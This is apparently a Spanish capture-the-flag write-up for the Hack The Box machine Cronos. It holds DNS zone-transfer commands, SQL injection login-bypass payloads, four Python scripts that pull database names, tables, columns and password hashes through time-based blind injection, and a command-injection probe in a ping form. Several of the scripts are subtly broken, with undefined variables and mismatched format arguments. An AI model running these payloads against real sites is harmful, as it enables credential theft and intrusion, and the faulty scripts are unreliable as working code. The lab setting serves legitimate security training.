## Vulnerability Assessment {-}

### AXFR {-}

```bash
dig @10.10.10.13 cronos.htb ns
dig @10.10.10.13 cronos.htb mx
dig @10.10.10.13 cronos.htb axfr
```

Aqui vemos que es vulnerable a ataques **AXFR** y vemos otro dominio `admin.cronos.htb` que añadimos al `/etc/hosts`.

Si visitamos esta nueva web con Firefox vemos un panel de inicio de session.

### SQL Injection {-}

En el UserName si le ponemos la injeccion SQL basica `' or 1=1-- -` y le damos a submit, entramos directamente en el panel
de administracion.

Como sabemos que esta vulnerable a injeccion SQL, probamos differentes cosas porque lo que nos interesa es tener usuarios y contrañas.

```bash
' order by 100-- -
' or sleep(5)-- -
```

Vemos que no esta vulnerable a un **Error Based SQL Injection** pero lo es a un **Time Based SQL Injection**.

```bash
admin' or sleep(5)-- -
admin' and sleep(5)-- -
```

Con estos commandos, comprobamos que el usuario admin existe.

Creamos un script en python para encontrar las informaciones con un **Time Based SQL Injection**

#### Time Based SQL Injection Autopwn {-}

Buscamos en nombre de la database

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Database")

    database = ""

    
    for position in range(1, 10):
        for character in s:
            p1.status("Probando con el caracter %c en la posicion %d" % (character, position))
            post_data = {
                'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
                'password': 'admin'
            }

            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                password += character
                p2.status(database)
                break

if __name__ == '__main__':

    makeRequest()
```

Aqui vemos que la base de datos se llama `admin`. Buscamos ahora el nombre de la tabla.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Table")

    table_name = ""

    for table in range(0,4):
        for position in range(1, 10):
            for character in s:
                p1.status("Probando con el caracter %c en la posicion %d de la tabla numero " % (character, position, table))
                post_data = {
                    'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    table_name += character
                    p2.status(table_name)
                    break
            break
        table_name += " - "

if __name__ == '__main__':

    makeRequest()
```

Ahora que sabemos que hay una tabla `users`, miramos las columnas.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Columns")

    column_name = ""

    for column in range(0,4):
        for position in range(1, 10):
            for character in s:
                p1.status("Probando con el caracter %c en la posicion %d de la columna numero %d de la tabla users " % (character, position, column))
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    column_name += character
                    p2.status(column_name)
                    break
            break
        table_name += " - "

if __name__ == '__main__':

    makeRequest()
```

Ahora conocemos las columnas, vamos a por las data.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")

    password = ""

    for user in range(0, 4):
        for position in range(1, 50):
            for character in s:
                p1.status("Posicion numero %d de la extraccion de password del usuario admin | Caracter %c" % (position, character))
                post_data = {
                    'username': "admin' and if(substr((select password from users limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (user, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    password += character
                    p2.status(password)

if __name__ == '__main__':

    makeRequest()
```

Aqui vemos que es un hash MD5 y passamos por rainbow tables para crackear la contraseña.

#### Utilizando la web {-}

La pagina web permite enviar ping a maquinas. Lo intentamos contra nuestra maquina de atacante.

1. En la maquina de atacante

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. Lanzamos por la web un ping a la 10.10.14.7

Y recibimos la traza.

Miramos si la web esta bien sanitizada mirando si poniendole `10.10.14.7; whoami` no salimos del contexto y es el caso.
Vamos a ganar accesso al systema.
